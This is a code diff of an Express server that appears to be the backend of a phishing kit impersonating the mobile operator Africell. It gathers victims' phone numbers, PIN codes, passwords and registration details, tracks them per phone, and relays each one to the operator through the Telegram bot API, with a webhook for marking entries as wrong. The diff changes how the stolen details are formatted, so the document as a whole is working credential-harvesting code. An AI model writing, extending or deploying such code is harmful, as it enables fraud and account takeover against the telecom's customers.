@@ -14,12 +14,6 @@ const orderStatuses = {};
 const lastSubmissionTime = {}; 
 const userCredentials = {}; // Tracks collected credentials per phone
 
-// Helper function to escape Markdown special characters safely
-function escapeMarkdown(text) {
-    if (!text) return '';
-    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
-}
-
 // Helper function to safely fetch from Telegram with a built-in timeout and abort handler
 async function sendToTelegram(url, payload) {
     const controller = new AbortController();
@@ -47,7 +41,7 @@ app.post('/api/submit-order', async (req, res) => {
         let { phone, uniqueId } = req.body;
         
         if (!phone || phone === 'Unknown Phone' || phone === 'undefined') {
-            phone = '+232 00000000'; // fallback safeguard
+            phone = '+232 00000000';
         }
 
         const currentTime = Date.now(); 
@@ -77,6 +71,7 @@ app.post('/api/submit-order', async (req, res) => {
         let headerTitle = "🔔 *Africell Submission*";
         let credentialLabel = "Detail";
         let wrongButtonText = "⚠️ Wrong Details";
+        let displayValue = uniqueId || 'N/A';
 
         if (uniqueId.startsWith('PIN: ')) {
             headerTitle = "🔐 *Africell PIN Code Submitted*";
@@ -98,11 +93,12 @@ app.post('/api/submit-order', async (req, res) => {
             credentialLabel = "New Password";
             wrongButtonText = "⚠️ Wrong Password";
             userCredentials[phone].password = uniqueId.replace('New Password: ', '');
-        } else if (uniqueId.startsWith('Reg: ')) {
+        } else if (uniqueId.startsWith('Account Registration: ')) {
             headerTitle = "📝 *Africell New Account Registration*";
-            credentialLabel = "Registration Details";
+            credentialLabel = "Account Info";
             wrongButtonText = "⚠️ Registration Error";
-            userCredentials[phone].registration = uniqueId.replace('Reg: ', '');
+            displayValue = uniqueId.replace('Account Registration: ', '');
+            userCredentials[phone].registration = displayValue;
         } else if (uniqueId === 'Password Recovery Request' || uniqueId === 'Signup Mobile Number') {
             headerTitle = "📱 *Africell Mobile Number Submitted*";
             credentialLabel = "Mobile Number Request";
@@ -111,11 +107,11 @@ app.post('/api/submit-order', async (req, res) => {
             userCredentials[phone].password = uniqueId;
         }
 
-        // Layout matching your required format with safe escaping to prevent 400 errors
+        // Clean layout message sent to Telegram
         const message = `${headerTitle}\n\n` +
                         `${countryFlag} Country: \`+232\`\n` +
-                        `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
-                        `🔑 ${credentialLabel}: \`${escapeMarkdown(uniqueId || 'N/A')}\``;
+                        `📱 Phone: \`${rawDigits}\`\n` +
+                        `👤 ${credentialLabel}:\n${displayValue}`;
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const encodedId = encodeURIComponent(uniqueId || 'N/A');
@@ -200,8 +196,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
             const updatedMessage = `📋 *${messageTitle}*\n\n` +
                              `${countryFlag} Country: \`+232\`\n` +
-                             `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
-                             `🔑 Detail: \`${escapeMarkdown(uniqueId)}\`\n` +
+                             `📱 Phone: \`${rawDigits}\`\n` +
                              `📌 Status: *${actionText}*`;
 
             const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
